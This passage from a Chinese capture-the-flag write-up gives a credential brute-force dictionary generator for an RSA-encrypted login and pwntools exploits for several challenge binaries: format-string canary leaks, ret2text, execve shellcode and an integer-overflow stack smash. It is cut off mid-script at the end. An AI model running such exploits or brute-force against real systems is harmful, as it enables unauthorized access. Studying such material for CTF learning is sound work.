class="string">&#x27;IeKGb&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x2ec083, _0x47b18b, _0x120b6a</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x2ec083(_0x47b18b, _0x120b6a);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;foePj&#x27;</span>: <span class="string">&#x27;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgU\nWXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPE\nHzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8Lr\nKJVXPMuQVgrw/SxkBQIDAQAB\n-----END PUBLIC KEY-----&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;iaWKq&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x1c6939, _0x219dc9</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x1c6939 + _0x219dc9;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;PUpKG&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x213ed6, _0xe318d3</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x213ed6 + _0xe318d3;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;JNTjF&#x27;</span>: <span class="string">&#x27;#username&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;OSnwF&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0xd115dc, _0x2bfff6</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0xd115dc(_0x2bfff6);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;bZMhU&#x27;</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;otSyR&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x486713, _0x17d2bc</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x486713 + _0x17d2bc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> _0x5182d1 = <span class="keyword">new</span> JSEncrypt();</span><br><span class="line">    <span class="keyword">let</span> _0x20b0a1 = _0x326c0f[<span class="string">&#x27;foePj&#x27;</span>];</span><br><span class="line">    _0x5182d1[<span class="string">&#x27;setPublicKey&#x27;</span>](_0x20b0a1);</span><br><span class="line">    <span class="keyword">var</span> _0x4833f6 = _0x5182d1[<span class="string">&#x27;encrypt&#x27;</span>](_0x326c0f[<span class="string">&#x27;iaWKq&#x27;</span>](_0x326c0f[<span class="string">&#x27;PUpKG&#x27;</span>]($(_0x326c0f[<span class="string">&#x27;JNTjF&#x27;</span>])[<span class="string">&#x27;val&#x27;</span>](), <span class="string">&#x27;|-|&#x27;</span>), _0x326c0f[<span class="string">&#x27;OSnwF&#x27;</span>]($, <span class="string">&#x27;#password&#x27;</span>)[<span class="string">&#x27;val&#x27;</span>]()));</span><br><span class="line">    $[<span class="string">&#x27;ajax&#x27;</span>](&#123;</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;login.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;type&#x27;</span>: _0x326c0f[<span class="string">&#x27;bZMhU&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: _0x326c0f[<span class="string">&#x27;otSyR&#x27;</span>](<span class="string">&#x27;data=&#x27;</span>, _0x4833f6),</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x1626c4</span>) </span>&#123;</span><br><span class="line">            coco[<span class="string">&#x27;alert&#x27;</span>](&#123;</span><br><span class="line">                <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;鎻愮ず&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;text&#x27;</span>: _0x1626c4</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">if</span> (_0x326c0f[<span class="string">&#x27;DTeqY&#x27;</span>](_0x1626c4, <span class="string">&#x27;登录成功&#x27;</span>)) &#123;</span><br><span class="line">                _0x326c0f[<span class="string">&#x27;IeKGb&#x27;</span>](<span class="built_in">setTimeout</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    location[<span class="string">&#x27;reload&#x27;</span>]();</span><br><span class="line">                &#125;, <span class="number">0x3e8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);;</span><br><span class="line">_0xod5 = <span class="string">&#x27;jsjiami.com.v6&#x27;</span></span><br></pre></td></tr></table></figure><p>分析发现，前端输入的账号密码，以 <code>username|-|password</code> 的方式组合后，再经RSA加密得到base64密文。</p><p>生成爆破用字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> Cipher_pkcs1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">public_key = <span class="string">&#x27;&#x27;&#x27;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgU</span></span><br><span class="line"><span class="string">WXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPE</span></span><br><span class="line"><span class="string">Hzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8Lr</span></span><br><span class="line"><span class="string">KJVXPMuQVgrw/SxkBQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">10000</span>)):</span><br><span class="line">password = <span class="built_in">str</span>(i)</span><br><span class="line">m = <span class="string">&#x27;admin|-|&#x27;</span> + password</span><br><span class="line">rsakey = RSA.importKey(public_key)</span><br><span class="line">cipher = Cipher_pkcs1_v1_5.new(rsakey)</span><br><span class="line">cipher_text = base64.b64encode(cipher.encrypt(m))</span><br><span class="line">f.write(cipher_text+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后上Burpsuite，加载新字典dict.txt，爆破拿到flag。</p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="# Pwn"></a># Pwn</h2><h3 id="fo"><a href="#fo" class="headerlink" title="fo"></a>fo</h3><p>关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  speaking();</span><br><span class="line">  leak();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">speaking</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(</span><br><span class="line">           <span class="string">&quot;Do you know the format string?\n&quot;</span></span><br><span class="line">           <span class="string">&quot;           you can message at here:\n&quot;</span></span><br><span class="line">           <span class="string">&quot;            https://wiki.x10sec.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">leak</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;I heared that you are interested in the CTF.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;           I hope that you will hold on to keep your interest\n&quot;</span></span><br><span class="line">    <span class="string">&quot;          tell me,will you?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will remember what you said&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wait for your good news...&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checksec发现存在canary，利用<code>leak()</code> 中存在的格式化字符串漏洞泄露canary，再实现ret2text。</p><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">38793</span>)</span><br><span class="line"></span><br><span class="line">[r.recvline() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;%17$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">canary = <span class="built_in">int</span>(r.recvline().strip()[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">backdoor_addr = <span class="number">0x40080D</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>-<span class="number">8</span>)+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(backdoor_addr)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h3><p>关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know the ShellCode?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n\n---------^-^----------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;show me your Migic&quot;</span>);</span><br><span class="line">  read_shell_code();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have you finished?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;~Bye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read_shell_code</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x5A</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read_shell_code()</code> 将输入的shellcode写入bss段 <code>buf</code> 区域，再通过 <code>read()</code> 实现ret2shellcode。</p><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">34717</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;show me your Migic\n&#x27;</span>)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;mov rbx,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov rax,0x3b</span></span><br><span class="line"><span class="string">syscall&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line">r.send(shellcode)</span><br><span class="line">r.recvline()</span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(<span class="number">0x601080</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="magic-int"><a href="#magic-int" class="headerlink" title="magic_int"></a>magic_int</h3><p>关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_400959, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = -v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">      EDG();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 <span class="title">EDG</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c中int取值范围为 -2147483648 ~ +2147483647，而 -2147483648 刚好为取反发生上溢的数，传入即可进入 <code>EDG()</code>，再ret2text。</p><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">38780</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400781</span></span><br><span class="line">r.send(<span class="string">&#x27;-2147483648\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x77</span> + p64(backdoor)</span><br><span class="line">r.send(pay)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="magic-abs"><a href="#magic-abs" class="headerlink" title="magic_abs"></a>magic_abs</h3><p>关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-84h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">92</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+6Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">time_t</span> timer; <span class="comment">// [rsp+70h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+84h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v3 = time(&amp;timer);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  v11 = read(<span class="number">0</span>, s, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Tell me your a g e:&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your lucky number?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  v10 = abs32(v5);</span><br><span class="line">  v9 = (<span class="keyword">int</span>)(v10 + v11);</span><br><span class="line">  v12 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi,%s And see you next time!\n&quot;</span>, s);</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Recording...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    v13 = rand() % (((<span class="keyword">int</span>)abs32(v5 + v7) &gt;&gt; v7) + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v13 = rand() % <span class="number">10000</span>;</span><br><span class="line">  record(s, v5, v13, v12);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">record</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n name: %s \n lucky number: %d \n tag: %d\n DOWN!\n&quot;</span>, a1, a2, a3);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( a4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;dest[a3], a1, v4);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, a1, v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造 <code>v7</code> 和 <code>v5</code>，使得 <code>(((int)abs32(v5 + v7) &gt;&gt; v7) + 1)</code> 为1，<code>v13</code> 不再随机只能取0，在 <code>record()</code> 中，输入的 <code>s</code> 作为payload复制到 <code>dest</code> 区域，造成栈溢出。</p><p>本地测试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v5 = <span class="number">-2147483647</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(<span class="keyword">int</span>)v5); <span class="comment">//-2147483647</span></span><br><span class="line">    <span class="keyword">int</span> v7 = <span class="number">2147483647</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,((<span class="keyword">int</span>)(v5+v7))&gt;&gt;v7); <span class="comment">//0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">36236</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">backdoor_addr = <span class="number">0x4009D7</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(backdoor_addr)</span><br><span class="line">r.send(pl)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">r.sendline(<span 